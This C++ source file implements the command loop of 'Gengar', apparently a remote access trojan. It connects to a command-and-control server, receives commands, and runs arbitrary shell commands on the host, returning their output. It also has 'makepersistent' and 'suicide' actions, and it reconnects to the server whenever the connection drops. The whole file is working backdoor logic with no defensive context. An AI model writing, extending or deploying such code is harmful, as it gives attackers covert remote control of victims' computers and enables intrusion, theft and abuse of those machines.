#include <iostream>
#include "gengar.h"

bool IsEqual(std::string str1, std::string str2)
{
	size_t len1 = str1.length();
	size_t len2 = str2.length();

	if (len1 > len2)
		return str1.substr(0, len2) == str2;
	else
		return str2.substr(0, len1) == str1;
}

void Gengar::ListenForCommand()
{
	char type_content_delimiter = ':';

	while (true)
	{
		try
		{
			std::string input = m_client.Receive();
			size_t delimiter_index = input.find(type_content_delimiter);

			if (delimiter_index == std::string::npos)
			{
				m_client.Send("Invalid command. Ignoring.\n");
			}
			else
			{
				std::string type = input.substr(0, delimiter_index);
				std::string content = input.substr(delimiter_index + 1, std::string::npos);
				RouteCommand(type, content);
			}
		}
		catch (boost::system::system_error&)
		{
			ConnectToCnc();
			ListenForCommand();
		}
	}
}


void Gengar::RouteCommand(std::string& type, std::string& content)
{
	std::string output;

	if (type == "shell")
	{
		output = m_machine.RunShellCommand(std::move(content));
	}
	else if (type == "action")
	{
		if (IsEqual(content, "makepersistent"))
		{
			m_machine.MakePersistent();
			output = "Gengar is now persistent.";
		}
		else if (IsEqual(content, "suicide"))
		{
			m_machine.Suicide();
		}
	}
	m_client.Send(std::move(output));
}


void Gengar::ConnectToCnc()
{
	m_client.Connect();
}
